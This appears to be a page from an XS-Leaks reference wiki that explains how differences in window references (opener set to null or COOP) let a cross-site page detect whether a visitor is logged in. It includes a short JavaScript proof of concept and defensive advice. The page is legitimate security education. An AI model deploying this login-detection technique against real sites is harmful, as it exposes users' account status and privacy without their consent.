+++
title = "Window References"
description = ""
date = "2020-10-08"
category = [
    "Attack",
]
abuse = [
    "Window References",
]
defenses = [
    "Fetch Metadata",
    "SameSite Cookies",
    "COOP"
]
menu = "main"
weight = 2
+++


If a page sets its opener property to `null` or is using [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) depending on users' login status, it becomes possible to detect user's current status. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users [^1] have access to, simply checking its window reference.

## Code Snippet
The below snippet demonstrates the attack where the target page is supposedly only accessible to authenticated users and is setting its `opener` property to null (or is using COOP with value other than `unsafe-none`):

```javascript
const url = 'https://example.org/profile';

const exploit = url => {
  document.body.insertAdjacentHTML('beforeend', '<iframe name="xsleaks" style="height:700px;width:100%;display:none">');
  const win = open(url, 'xsleaks');
  setTimeout(() => {
    if(!win) console.log('User\'s logged in- reference not defined');
  }, 2000);
}
exploit(url);
```
In case the page is not framable (or uses SameSite cookies), we can instead open the page in a new tab (`target="_blank"`) and achieve the same.

## Defense

The mitigation of this XS-Leak is to be consistent everywhere- set it to the same value in all pages using COOP. Using JavaScript to set `opener` to `null` may have edge cases because it's possible to disable JavaScript entirely using iframe's sandbox attribute.

## References

[^1]: Twitter ID exposure via error-based side-channel attack, [link](https://hackerone.com/reports/505424)
